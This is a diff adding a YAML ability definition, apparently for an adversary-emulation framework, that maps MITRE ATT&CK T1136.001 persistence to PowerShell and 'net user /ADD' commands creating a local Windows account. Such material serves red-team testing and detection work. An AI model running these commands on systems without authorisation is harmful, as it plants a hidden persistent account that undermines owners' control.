@@ -1,0 +1,26 @@
+id: 28f0b748-207a-4e5c-84cc-be13da2ade48
+name: Create Local User
+description: Creates a local user on the specified computer
+metadata:
+  version: 2
+  authors:
+    - w0rk3r
+  tags: []
+tactic: persistence
+technique:
+  id: T1136.001
+  name: "Create Account: Local Account"
+platforms:
+  windows:
+    psh:
+      command: |
+        $AccountPassword = '#{persistence.local.new.user.password}'
+        $SamAccountName = '#{persistence.local.new.user.name}'
+        $ComputerName =  '#{persistence.local.new.user.computer}'
+        $ObjOu = [ADSI]"WinNT://$ComputerName"
+        $ObjUser = $ObjOu.Create('User', $SamAccountName)
+        $ObjUser.SetPassword($AccountPassword)
+        $Null = $ObjUser.SetInfo()
+    cmd:
+      command: |
+        net user #{persistence.local.new.user.name} #{persistence.local.new.user.password} /ADD
